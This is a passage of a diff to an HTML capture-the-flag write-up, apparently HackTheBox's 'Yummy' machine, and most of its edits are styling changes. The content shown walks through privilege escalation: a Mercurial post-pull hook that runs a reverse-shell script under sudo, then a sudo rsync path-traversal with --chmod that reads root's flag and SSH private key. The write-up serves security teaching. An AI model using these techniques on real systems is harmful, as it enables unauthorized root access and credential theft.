 <p>Looking online this command is used by Mercurial SCM. In our home folder we have a <code v-pre>.hgrc</code> file that contains some configuration options. One option of Mercurial is to create hooks that run before/after certain actions. From the <a href="https://repo.mercurial-scm.org/hg/help/hgrc">Mercurial Docs</a> there is also a hook called <code v-pre>post-&lt;command&gt;</code> that runs after successful invocations of the associated command.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~$ nano .hgrc
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~$ nano .hgrc
 [hooks]
 post-pull = /tmp/shell.sh</code></pre>
 </doc-codeblock></div>
 <p>Again we download our shell and modify the <code v-pre>.hgrc</code> file to run our shell after a pull request. Next we run a netcat listener and perform the pull request as the <code v-pre>dev</code> user.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
 abort: Permission denied: '/home/qa/.hg'</code></pre>
 </doc-codeblock></div>
 <p>When running the command, we get a permission denied error so we try another way. From the same documentation, you can also specify the configuration file inside the <code v-pre>.hg</code> folder per repository. We can create this file in the <code v-pre>/tmp</code> directory and then try to run our exploit again.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~/tmp$ mkdir .hg
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~/tmp$ mkdir .hg
 qa@yummy:~/tmp$ chmod 777 .hg
 qa@yummy:~/tmp$ cp ~/.hgrc .hg/hgrc
 qa@yummy:~/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/</code></pre>
@@ -490,18 +491,18 @@ qa@yummy:~/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/</code></p
 </doc-anchor-target>
 <p>We now have a shell as the <code v-pre>dev</code> user that can run <code v-pre>rsync</code> as root. Rsync is a tool for synchronizing files and directories between location.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">dev@yummy:~/app-production$ sudo -l
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">dev@yummy:~/app-production$ sudo -l
 User dev may run the following commands on localhost:
     (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/</code></pre>
 </doc-codeblock></div>
 <p>We can exploit this by copying the root user&#x27;s private SSH key. One quick way to read the root flag or root SSH key is using the following command:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">dev@yummy:~$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/../../../root/root.txt --chmod=777 /opt/app/ &amp;&amp; cat /opt/app/root.txt
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">dev@yummy:~$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/../../../root/root.txt --chmod=777 /opt/app/ &amp;&amp; cat /opt/app/root.txt
 dev@yummy:~$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/../../../root/.ssh/id_rsa --chmod=777 /opt/app/ &amp;&amp; cat /opt/app/id_rsa</code></pre>
 </doc-codeblock></div>
 <p>The key element is the <code v-pre>--chmod</code> flag of the rsync binary. This additional parameter changes the ownership of the copied file. Since we are the <code v-pre>dev</code> user, all files will be copied under our permissions, so this option lets us change the permission of file we copied from the root directory. Now we can copy the SSH key and login as the root user.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ chmod 600 id_rsa
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ chmod 600 id_rsa
 $ ssh -i id_rsa root@yummy.htb
 root@yummy:~# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -512,23 +513,23 @@ root@yummy:~# cat root.txt</code></pre>
                                 <!-- Required only on API pages -->
                                 <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                             </div>
-                            <footer class="clear-both">
+                            <footer id="retype-content-footer" class="clear-both">
                             
-                                <nav class="print:hidden flex mt-14">
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/vintage/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/vintage/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Vintage (Hard)</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/sherlocks/procnet/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/sherlocks/procnet/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Proc​Net (Hard)</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -538,24 +539,24 @@ root@yummy:~# cat root.txt</code></pre>
                             </footer>
                         </main>
                 
-                        <div class="print:border-none border-t dark:border-dark-650 pt-6 mb-8">
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
                             <footer class="flex flex-wrap items-center justify-between print:justify-center">
-                                <div class="print:hidden">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="print:justify-center docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -571,7 +572,7 @@ root@yummy:~# cat root.txt</code></pre>
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Yummy (Hard)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
